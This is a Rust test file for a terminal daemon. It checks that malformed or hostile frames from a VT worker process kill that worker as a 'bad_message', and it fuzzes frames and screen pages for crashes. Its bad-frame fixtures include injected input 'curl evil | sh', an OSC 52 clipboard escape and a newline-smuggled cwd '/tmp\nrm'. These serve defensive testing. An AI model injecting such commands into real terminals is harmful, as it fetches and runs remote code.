//! A VT worker's output is untrusted (p01-process-141, Chrome's
//! `bad_message::ReceivedBadMessage` rule): every bad frame a worker sends
//! ends that worker with reason `bad_message` and names its terminals for
//! reseeding, and no fuzzed frame or screen page makes the daemon's reader
//! panic or read outside a buffer or mapping.
//!
//! The test plays the worker on one end of a socket pair; the daemon's
//! side is `vt_worker_runtime::drain_frames`, and the process it kills is a
//! real child (`sleep`), so "ends the worker" is checked by its exit
//! signal.

#![cfg(unix)]

use std::io::Write;
use std::os::fd::{AsRawFd, OwnedFd};
use std::os::unix::net::UnixStream;
use std::os::unix::process::ExitStatusExt;
use std::process::{Child, Command, Stdio};

use cmux_tui_core::vt_worker_runtime::worker::sandbox::SandboxMechanism;
use cmux_tui_core::vt_worker_runtime::worker::screen_page::{
    self, PageEncoder, PageMeta, PageReader, PageWriter,
};
use cmux_tui_core::vt_worker_runtime::worker::wire::{
    self, Event, FrameReader, Geometry, WIRE_VERSION,
};
use cmux_tui_core::vt_worker_runtime::{
    BAD_MESSAGE_REASON, BadMessage, HelloExpectation, PageRead, RingOffsets, WorkerEnd,
    WorkerOutputGuard, drain_frames,
};

const GRID: Geometry = Geometry { cols: 80, rows: 24, cell_width: 8, cell_height: 16 };
const PID: u32 = 4242;

/// The daemon's view of the rings: terminal 1's ring keeps from offset 0.
struct Rings;

impl RingOffsets for Rings {
    fn oldest(&self, _id: u64) -> Option<u64> {
        Some(0)
    }
}

fn stand_in_worker() -> Child {
    Command::new("sleep")
        .arg("60")
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .spawn()
        .expect("spawn the stand-in worker")
}

/// A greeted guard with terminals 1 and 2 attached at 0, announced to 1000.
fn guard() -> WorkerOutputGuard {
    let mut guard = WorkerOutputGuard::new(HelloExpectation {
        sandbox: SandboxMechanism::None,
        pid: Some(PID),
    });
    for id in [1, 2] {
        guard.attached(id, 0, GRID);
        guard.advanced(id, 1000);
    }
    guard
}

fn hello() -> Event {
    Event::Hello { version: WIRE_VERSION, sandbox: SandboxMechanism::None, pid: PID }
}

/// A raw frame: `payload length u32 | kind u8 | descriptors u8 | 0 u16 | payload`.
fn raw(kind: u8, payload: &[u8]) -> Vec<u8> {
    let mut frame = (payload.len() as u32).to_le_bytes().to_vec();
    frame.extend_from_slice(&[kind, 0, 0, 0]);
    frame.extend_from_slice(payload);
    frame
}

/// What the worker side sends: events through the worker's own encoder,
/// or raw bytes.
enum Sent {
    Event(Event),
    Raw(Vec<u8>),
}

/// Send `frames` from the worker's end, then let the daemon's side drain
/// them against `guard`, killing `child` on a bad one.
fn run(
    guard: &mut WorkerOutputGuard,
    child: &mut Child,
    frames: &[Sent],
) -> (Vec<Event>, Result<(), WorkerEnd>) {
    let (daemon, mut worker) = UnixStream::pair().expect("socket pair");
    for frame in frames {
        match frame {
            Sent::Event(event) => wire::send_event(worker.as_raw_fd(), event).expect("send"),
            Sent::Raw(bytes) => worker.write_all(bytes).expect("send raw"),
        }
    }
    drop(worker);
    let mut reader = FrameReader::default();
    let mut accepted = Vec::new();
    loop {
        if let Err(end) = drain_frames(&mut reader, guard, &Rings, child, &mut accepted) {
            return (accepted, Err(end));
        }
        if reader.fill(daemon.as_raw_fd()).expect("read") == 0 {
            return (accepted, Ok(()));
        }
    }
}

fn bad_frames() -> Vec<(&'static str, Sent)> {
    let event = |event| Sent::Event(event);
    vec![
        ("a second HELLO", event(hello())),
        ("a terminal outside the shard", event(Event::Bell { id: 9, count: 1 })),
        ("parsed past the ring", event(Event::Parsed { id: 1, offset: 1001, frame: 1 })),
        (
            "typed input as an answer",
            event(Event::PtyWrite { id: 1, bytes: b"curl evil | sh\r".to_vec() }),
        ),
        (
            "an OSC 52 reply",
            event(Event::PtyWrite { id: 1, bytes: b"\x1b]52;c;eA==\x07".to_vec() }),
        ),
        ("a title with an escape", event(Event::Title { id: 1, title: "x\x1b[2J".into() })),
        ("a cwd with a newline", event(Event::Pwd { id: 2, pwd: "/tmp\nrm".into() })),
        ("a lap past the ring", event(Event::Lapped { id: 1, from: 0, oldest: 5000 })),
        (
            "a page need over the grid",
            event(Event::PageTooSmall { id: 1, needed: screen_page::MAX_PAGE_BYTES as u64 }),
        ),
        ("an unknown kind", Sent::Raw(raw(200, &[]))),
        ("a command kind", Sent::Raw(raw(3, &[0; 16]))),
        ("a truncated PARSED", Sent::Raw(raw(65, &[1, 0, 0, 0]))),
        ("a title that is not UTF-8", Sent::Raw(raw(67, &[1, 0, 0, 0, 0, 0, 0, 0, 0xff]))),
        ("a payload over the limit", Sent::Raw(oversized_header())),
    ]
}

/// A frame header that claims one byte more than any payload may have.
fn oversized_header() -> Vec<u8> {
    let mut header = (wire::MAX_PAYLOAD as u32 + 1).to_le_bytes().to_vec();
    header.extend_from_slice(&[65, 0, 0, 0]);
    header
}

#[test]
fn every_bad_frame_ends_the_worker_with_reason_bad_message() {
    for (what, bad) in bad_frames() {
        let mut child = stand_in_worker();
        let mut guard = guard();
        let after = Event::Bell { id: 1, count: 1 };
        let frames = [
            Sent::Event(hello()),
            Sent::Event(Event::Parsed { id: 1, offset: 10, frame: 1 }),
            bad,
            Sent::Event(after),
        ];
        let (accepted, end) = run(&mut guard, &mut child, &frames);
        let end = end.expect_err(what);
        assert_eq!(end.reason(), BAD_MESSAGE_REASON, "{what}");
        assert_eq!(end.reseed, vec![1, 2], "{what}: every terminal of the shard is reseeded");
        assert_eq!(end.kill_error, None, "{what}");
        // Nothing after the bad frame was acted on.
        assert_eq!(accepted.len(), 2, "{what}: {accepted:?}");
        let status = child.wait().expect("reap");
        assert_eq!(status.signal(), Some(9), "{what}: the worker was killed");
    }
}

#[test]
fn a_well_behaved_worker_keeps_running() {
    let mut child = stand_in_worker();
    let mut guard = guard();
    let frames = [
        Sent::Event(hello()),
        Sent::Event(Event::Parsed { id: 1, offset: 0, frame: 1 }),
        Sent::Event(Event::PtyWrite { id: 1, bytes: b"\x1b[?62;22c\x1b[0n".to_vec() }),
        Sent::Event(Event::Title { id: 1, title: "htop".into() }),
        Sent::Event(Event::Pwd { id: 2, pwd: "file:///home/u".into() }),
        Sent::Event(Event::Bell { id: 2, count: 3 }),
        Sent::Event(Event::Parsed { id: 1, offset: 1000, frame: 2 }),
    ];
    let (accepted, end) = run(&mut guard, &mut child, &frames);
    assert_eq!(end, Ok(()));
    assert_eq!(accepted.len(), frames.len());
    assert_eq!(child.try_wait().expect("status"), None, "the worker still runs");
    child.kill().expect("kill");
    child.wait().expect("reap");
}

/// xorshift64: the same fuzz run every time.
struct Fuzz(u64);

impl Fuzz {
    fn next(&mut self) -> u64 {
        self.0 ^= self.0 << 13;
        self.0 ^= self.0 >> 7;
        self.0 ^= self.0 << 17;
        self.0
    }

    fn mutate(&mut self, bytes: &mut [u8]) {
        if bytes.is_empty() {
            return;
        }
        for _ in 0..1 + self.next() % 6 {
            let at = (self.next() as usize) % bytes.len();
            bytes[at] = self.next() as u8;
        }
    }
}

#[derive(Debug)]
struct NoProcess;

impl cmux_tui_core::vt_worker_runtime::GuardedProcess for NoProcess {
    fn kill(&mut self) -> std::io::Result<()> {
        Ok(())
    }
}

#[test]
fn fuzzed_frames_are_accepted_or_bad_never_a_panic() {
    let seeds: Vec<Vec<u8>> = [
        Event::Parsed { id: 1, offset: 5, frame: 1 },
        Event::PtyWrite { id: 1, bytes: b"\x1b]11;rgb:00/00/00\x1b\\".to_vec() },
        Event::Title { id: 2, title: "t".into() },
        Event::Lapped { id: 1, from: 0, oldest: 0 },
        Event::PageTooSmall { id: 2, needed: 9000 },
    ]
    .iter()
    .map(|event| {
        let (a, b) = UnixStream::pair().expect("pair");
        wire::send_event(a.as_raw_fd(), event).expect("send");
        drop(a);
        let mut reader = FrameReader::default();
        reader.fill(b.as_raw_fd()).expect("fill");
        let frame = reader.next_frame().expect("frame").expect("whole");
        raw(frame.kind, &frame.payload)
    })
    .collect();
    let mut fuzz = Fuzz(0x2545_f491_4f6c_dd1d);
    for round in 0..20_000 {
        let mut bytes = seeds[round % seeds.len()].clone();
        fuzz.mutate(&mut bytes);
        let cut = (fuzz.next() as usize) % (bytes.len() + 1);
        let (daemon, mut worker) = UnixStream::pair().expect("pair");
        worker.write_all(&raw(64, &hello_payload())).expect("hello");
        worker.write_all(&bytes[..cut]).expect("send");
        drop(worker);
        let mut guard = guard();
        let mut reader = FrameReader::default();
        let mut accepted = Vec::new();
        while reader.fill(daemon.as_raw_fd()).expect("read") != 0 {}
        let result = drain_frames(&mut reader, &mut guard, &Rings, &mut NoProcess, &mut accepted);
        if let Err(end) = result {
            assert_eq!(end.reason(), BAD_MESSAGE_REASON);
        }
    }
}

fn hello_payload() -> Vec<u8> {
    let mut payload = WIRE_VERSION.to_le_bytes().to_vec();
    payload.push(SandboxMechanism::None as u8);
    payload.extend_from_slice(&PID.to_le_bytes());
    payload
}

fn page(len: usize) -> (PageWriter, PageReader) {
    let fd: OwnedFd = screen_page::create_page(len).expect("page");
    let reader = PageReader::open(&fd, len).expect("reader");
    (PageWriter::open(fd, len).expect("writer"), reader)
}

fn screen_image(encoder: &mut PageEncoder) -> Vec<u8> {
    encoder.begin();
    let cell = ghostty_vt::Cell { text: "é".into(), ..ghostty_vt::Cell::default() };
    for _ in 0..4 {
        encoder.push_row(&vec![cell.clone(); 6]);
    }
    let meta = PageMeta {
        parsed: 10,
        frame: 1,
        cols: 6,
        cursor: None,
        cursor_visual: (ghostty_vt::CursorShape::Block, false),
        modes: screen_page::Modes::default(),
        mouse_format: ghostty_vt::MouseWireFormat::X10,
    };
    encoder.finish(&meta).to_vec()
}

#[test]
fn fuzzed_pages_are_screens_or_bad_messages_never_out_of_bounds() {
    let len = screen_page::page_len_for(6, 4);
    let (mut writer, mut reader) = page(len);
    let mut guard =
        WorkerOutputGuard::new(HelloExpectation { sandbox: SandboxMechanism::None, pid: None });
    guard.attached(1, 0, Geometry { cols: 6, rows: 4, cell_width: 8, cell_height: 16 });
    guard.advanced(1, 100);
    let good = screen_image(&mut PageEncoder::default());
    writer.publish(&good);
    assert!(matches!(guard.read_page(1, &mut reader), Ok(PageRead::Screen(_))));

    let mut fuzz = Fuzz(0x9e37_79b9_7f4a_7c15);
    let (mut screens, mut bad) = (0, 0);
    for _ in 0..20_000 {
        let mut image = good.clone();
        fuzz.mutate(&mut image);
        // Keep the seqlock word: the writer owns it.
        image[8..16].fill(0);
        // A cut image stays a whole number of words, as a writer stores.
        image.truncate(((fuzz.next() as usize) % (image.len() + 1)) & !7);
        writer.publish(&image);
        match guard.read_page(1, &mut reader) {
            Ok(PageRead::Screen(screen)) => {
                screens += 1;
                assert!(screen.cells.len() <= usize::from(screen.rows));
                assert!(screen.cells.iter().all(|row| row.len() <= usize::from(screen.cols)));
            }
            Ok(_) => {}
            Err(end) => {
                bad += 1;
                assert_eq!(end.reason(), BAD_MESSAGE_REASON);
            }
        }
    }
    assert!(screens > 0 && bad > 0, "screens {screens}, bad {bad}");
}

/// Every answer libghostty-vt gives the queries programs send passes the
/// answer set, so a worker that only parses never trips the rule.
#[test]
fn ghostty_answers_pass_the_answer_set() {
    let queries: &[&[u8]] = &[
        b"\x1b[c",
        b"\x1b[>c",
        b"\x1b[=c",
        b"\x1b[5n",
        b"\x1b[6n",
        b"\x1b[?6n",
        b"\x1b[?996n",
        b"\x1b[?2004$p",
        b"\x1b[4$p",
        b"\x1b[?u",
        b"\x1b[>q",
        b"\x1b[14t",
        b"\x1b[16t",
        b"\x1b[18t",
        b"\x1b]10;?\x07",
        b"\x1b]11;?\x1b\\",
        b"\x1b]4;1;?\x07",
        b"\x1b]21;foreground=?\x1b\\",
        b"\x1b]7501;?\x1b\\",
        b"\x1bP$qm\x1b\\",
        b"\x1bP$qr\x1b\\",
        b"\x1bP+q544e\x1b\\",
        b"\x1b_Gi=31,s=1,v=1,a=q,t=d,f=24;AAAA\x1b\\",
    ];
    let answers = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let callbacks = ghostty_vt::Callbacks {
        on_pty_write: Some(Box::new({
            let answers = answers.clone();
            move |bytes| answers.lock().expect("answers").extend_from_slice(bytes)
        })),
        // The worker's parser has an OSC 7501 owner, so it answers the
        // support query.
        on_program_status: Some(Box::new(|_| {})),
        ..ghostty_vt::Callbacks::default()
    };
    let mut terminal = ghostty_vt::Terminal::new(80, 24, 0, callbacks).expect("terminal");
    terminal.resize(80, 24, 8, 16).expect("resize");
    let mut guard = guard();
    guard.check(hello(), &Rings).expect("hello");
    let mut answered = 0;
    for query in queries {
        terminal.vt_write(query);
        let bytes = std::mem::take(&mut *answers.lock().expect("answers"));
        if bytes.is_empty() {
            continue;
        }
        answered += 1;
        let event = Event::PtyWrite { id: 1, bytes: bytes.clone() };
        assert_eq!(
            guard.check(event.clone(), &Rings),
            Ok(Some(event)),
            "{} answered {}",
            query.escape_ascii(),
            bytes.escape_ascii()
        );
    }
    assert!(answered > queries.len() / 2, "only {answered} queries answered");
}

#[test]
fn a_page_parsed_past_the_ring_is_a_bad_message() {
    let (mut writer, mut reader) = page(screen_page::page_len_for(6, 4));
    let mut guard =
        WorkerOutputGuard::new(HelloExpectation { sandbox: SandboxMechanism::None, pid: None });
    guard.attached(1, 0, Geometry { cols: 6, rows: 4, cell_width: 8, cell_height: 16 });
    writer.publish(&screen_image(&mut PageEncoder::default()));
    assert_eq!(
        guard.read_page(1, &mut reader),
        Err(BadMessage::Page { id: 1, what: "screen parsed past the ring" })
    );
}
